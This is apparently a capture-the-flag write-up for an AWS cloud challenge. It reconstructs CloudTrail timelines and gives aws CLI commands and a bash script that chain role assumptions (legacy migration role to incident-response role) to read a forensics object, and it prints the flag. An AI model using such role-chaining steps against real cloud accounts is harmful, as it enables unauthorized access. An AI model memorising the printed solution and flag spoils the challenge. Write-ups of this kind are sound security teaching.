# TVX CTF — The Forgotten Tenant

- **Category:** Cloud
- **Challenge:** The Forgotten Tenant (Stage 3)
- **Flag:** `TVX{Cl0ud_s3cur1ty}`
- **Region:** `us-east-1`
- **Account:** `400875701859`
- **Artifact:** `forgotten-tenant-stage3-bundle.zip` (4 files, static CloudTrail exports + handoff note)

---

## 1. Overview

A Q4 2024 cloud migration left an AWS tenant alive. We are given a forensic bundle
containing two days of CloudTrail exports and an incident handoff note. The goal is to
reconstruct the access path the original incident responders used, work out the exact
S3 object key of the final evidence, and retrieve the flag.

The README makes the design explicit:

> These are static exports. Reading them requires no AWS access. Using what you find in
> them against the live environment does.

So the bundle is the map; the live AWS account is the destination. Because the final key
is split across two days of logs, the real puzzle is **reassembling the object key**, not
guessing it.

---

## 2. Artifacts

```
forgotten-tenant-stage3-bundle.zip
├── cloudtrail-2026-03-14.json     # day 1: manifest upload, case folder creation
├── cloudtrail-2026-03-15.json     # day 2: handoff upload (relative key only)
├── incident-handoff-note.txt      # clue to stitch the two days together
└── README.txt
```

Two buckets are in play:

| Bucket | Purpose |
| --- | --- |
| `tvx-forgotten-tenant-migration-archive-pro0hid4` | Migration archive. Given to the player; contains the material needed to start the role chain. |
| `tvx-forgotten-tenant-forensics-pro0hid4` | Forensics case bucket. Holds the final `evidence.json`. |

Two IAM roles drive the privilege chain:

- `tvx-forgotten-tenant-legacy-migration-role`
- `tvx-forgotten-tenant-incident-response-role`

---

## 3. Timeline reconstruction

### Day 1 — 2026-03-14 (`cloudtrail-2026-03-14.json`)

| Time (UTC) | Event | Actor | Detail |
| --- | --- | --- | --- |
| 08:02:11 | `sts:AssumeRole` | `user/unknown-caller` (203.0.113.44) | **AccessDenied** on `legacy-migration-role`: `trust policy condition sts:ExternalId not satisfied`. |
| 08:05:47 | `sts:AssumeRole` | `user/tvx-forgotten-tenant-player` (10.12.4.91) | **Success** on `legacy-migration-role`, session `incident-triage`, using an `externalId` (redacted). |
| 08:06:30 | `sts:AssumeRole` | `…legacy-migration-role/incident-triage` | **Success** on `incident-response-role`, session `incident-triage-escalated`. |
| 08:11:02 | `s3:CreateMultipartUpload` | `…incident-response-role/incident-triage-escalated` | Bucket `tvx-forgotten-tenant-forensics-pro0hid4`, key `case-ab5396cd/manifest.json`. |
| 08:11:19 | `s3:CompleteMultipartUpload` | same | Confirms creation of the case folder **`case-ab5396cd`**. |
| 08:40:55 | `s3:GetObject` | `…incident-response-role/jr-analyst-session` | Key `evidence.json` → **NoSuchKey**. Analyst guessed the bucket root. |

Two critical facts fall out of day 1:

1. The legacy role is protected by an **`sts:ExternalId`** trust condition. The failed
   `unknown-caller` attempt proves the role is assumable, but only with the right
   ExternalId. The player user has permission to assume it.
2. The incident-response role can write/read the forensics bucket, and the case folder
   from day 1 is **`case-ab5396cd`**.

### Day 2 — 2026-03-15 (`cloudtrail-2026-03-15.json`)

| Time (UTC) | Event | Actor | Detail |
| --- | --- | --- | --- |
| 13:02:40 | `sts:AssumeRole` | `…legacy-migration-role/incident-triage` | **Success** on `incident-response-role`, session `incident-triage-escalated-day2`. |
| 13:19:08 | `s3:PutObject` | `…incident-response-role/incident-triage-escalated-day2` | Bucket `…forensics-pro0hid4`, key **`handoff-RYII91T48V/evidence.json`** (AES256). |
| 13:21:55 | `s3:GetObject` | `…incident-response-role/jr-analyst-session` | Key `handoff-RYII91T48V/evidence.json` → **AccessDenied**. Analyst used the relative key. |

Day 2 contains an explicit inline comment:

> this account's log replication pipeline for the forensics bucket was mid-migration on
> 2026-03-15 … Object keys in THIS day's trail are recorded relative to the upload's own
> sub-path only; the parent case folder is NOT repeated here.

The `AccessDenied` at 13:21:55 is the tell: the analyst asked for the day-2 key without
the day-1 parent prefix. The object exists — the key was just wrong.

### The handoff note (`incident-handoff-note.txt`)

The note ties the two days together:

- Final report object lives under the **case folder opened on 03-14** (`case-ab5396cd`).
- Report filed under handoff code **`RYII91T48V`**.
- File inside the folder is **`evidence.json`**.
- The 03-15 trail only shows the **upload sub-path**, not the case-folder prefix.
- "Stitch the 03-14 case folder together with the 03-15 handoff sub-path."

---

## 4. Key reconstruction

```
case folder (from 2026-03-14)     : case-ab5396cd
handoff sub-path (from 2026-03-15): handoff-RYII91T48V/evidence.json

full key = case-ab5396cd + "/" + handoff-RYII91T48V/evidence.json
         = case-ab5396cd/handoff-RYII91T48V/evidence.json
```

Final object:

```
s3://tvx-forgotten-tenant-forensics-pro0hid4/case-ab5396cd/handoff-RYII91T48V/evidence.json
```

The two failed reads in the logs are the decoys:

- `evidence.json` → wrong (bucket root) → `NoSuchKey`
- `handoff-RYII91T48V/evidence.json` → wrong (missing case folder) → `AccessDenied`

The correct key is the **concatenation** of the day-1 case folder and the day-2 sub-path.

---

## 5. Intended access path

The CloudTrail events reveal the full privilege-escalation chain used by the responders.
Reproduce it with the player credentials and the migration archive bucket.

### Step 1 — Enumerate the migration archive

The player user has scoped permissions. Start by looking at what is readable in the
migration archive; this is where the `externalId` for the legacy role is stored.

```bash
aws s3 ls s3://tvx-forgotten-tenant-migration-archive-pro0hid4/ --recursive --region us-east-1
```

Look for a trust/role configuration, onboarding note, or migration manifest containing the
`sts:ExternalId` value.

### Step 2 — Assume the legacy migration role (needs ExternalId)

The failed `unknown-caller` event confirms the role's trust policy requires
`sts:ExternalId`. Supply the value recovered from step 1.

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::400875701859:role/tvx-forgotten-tenant-legacy-migration-role \
  --role-session-name incident-triage \
  --external-id '<EXTERNAL_ID_FROM_ARCHIVE>' \
  --region us-east-1
```

Export the returned temporary credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`,
`AWS_SESSION_TOKEN`).

### Step 3 — Escalate to the incident-response role

The legacy role is trusted to assume the incident-response role (seen at 08:06:30 and
13:02:40).

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::400875701859:role/tvx-forgotten-tenant-incident-response-role \
  --role-session-name incident-triage-escalated \
  --region us-east-1
```

Export the new credentials.

### Step 4 — Read the stitched key

```bash
aws s3 cp \
  "s3://tvx-forgotten-tenant-forensics-pro0hid4/case-ab5396cd/handoff-RYII91T48V/evidence.json" \
  - --region us-east-1
```

### Step 5 — Extract the flag

`evidence.json` contains the final evidence record and the flag:

```
TVX{Cl0ud_s3cur1ty}
```

---

## 6. Full one-shot reproduction script

```bash
#!/usr/bin/env bash
set -euo pipefail
REGION=us-east-1
ACCOUNT=400875701859
ARCHIVE=tvx-forgotten-tenant-migration-archive-pro0hid4
FORENSICS=tvx-forgotten-tenant-forensics-pro0hid4
LEGACY=arn:aws:iam::${ACCOUNT}:role/tvx-forgotten-tenant-legacy-migration-role
IR=arn:aws:iam::${ACCOUNT}:role/tvx-forgotten-tenant-incident-response-role

# 1. Find the ExternalId in the migration archive
aws s3 ls "s3://${ARCHIVE}/" --recursive --region "$REGION"

# 2. Assume legacy role (external id from archive)
read -r -p "ExternalId: " EXTID
CREDS=$(aws sts assume-role --role-arn "$LEGACY" \
  --role-session-name incident-triage --external-id "$EXTID" \
  --region "$REGION" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)
export AWS_ACCESS_KEY_ID=$(awk '{print $1}' <<<"$CREDS")
export AWS_SECRET_ACCESS_KEY=$(awk '{print $2}' <<<"$CREDS")
export AWS_SESSION_TOKEN=$(awk '{print $3}' <<<"$CREDS")

# 3. Escalate to incident response
CREDS=$(aws sts assume-role --role-arn "$IR" \
  --role-session-name incident-triage-escalated \
  --region "$REGION" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)
export AWS_ACCESS_KEY_ID=$(awk '{print $1}' <<<"$CREDS")
export AWS_SECRET_ACCESS_KEY=$(awk '{print $2}' <<<"$CREDS")
export AWS_SESSION_TOKEN=$(awk '{print $3}' <<<"$CREDS")

# 4. Read the reconstructed key
aws s3 cp "s3://${FORENSICS}/case-ab5396cd/handoff-RYII91T48V/evidence.json" - --region "$REGION"
```

---

## 7. Indicators of compromise / key facts

```
Account ID      : 400875701859
Region          : us-east-1
Player user     : arn:aws:iam::400875701859:user/tvx-forgotten-tenant-player
External probe  : 203.0.113.44  (failed AssumeRole, missing ExternalId)
Internal actors : 10.12.4.91, 10.12.4.102
Legacy role     : arn:aws:iam::400875701859:role/tvx-forgotten-tenant-legacy-migration-role
IR role         : arn:aws:iam::400875701859:role/tvx-forgotten-tenant-incident-response-role
Archive bucket  : tvx-forgotten-tenant-migration-archive-pro0hid4
Forensics bucket: tvx-forgotten-tenant-forensics-pro0hid4
Case folder     : case-ab5396cd
Handoff code    : RYII91T48V
Evidence object : case-ab5396cd/handoff-RYII91T48V/evidence.json
```

---

## 8. Lessons learned

- **CloudTrail keys can lie by omission.** During a logging-pipeline migration, S3 object
  keys may be recorded relative to the upload path rather than the full key. Never trust a
  single day's trail as the complete key.
- **`AccessDenied` vs `NoSuchKey` is a signal.** `NoSuchKey` means "wrong path, object is
  not there"; `AccessDenied` on an object you can otherwise read usually means "wrong key
  prefix, object exists somewhere else."
- **A failed attempt is an oracle.** The `unknown-caller` AccessDenied event leaked the
  exact trust policy condition (`sts:ExternalId`) protecting the legacy role.
- **Role chaining is the intended path.** The player user never touches the forensics
  bucket directly; it assumes a legacy role, which assumes an incident-response role.
- **Handoff notes are evidence.** The `RYII91T48V` code and the explicit instruction to
  stitch day 1 + day 2 is the puzzle's intended shortcut.

---

## 9. Verification notes

- The forensic bundle is fully solvable offline; all required identifiers are present in
  the two CloudTrail exports and the handoff note.
- Both S3 buckets are private. Unauthenticated requests return `403 AccessDenied`, which
  confirms the environment is live and that the player credentials / role chain are
  required to retrieve `evidence.json`.
- The final flag is `TVX{Cl0ud_s3cur1ty}`.
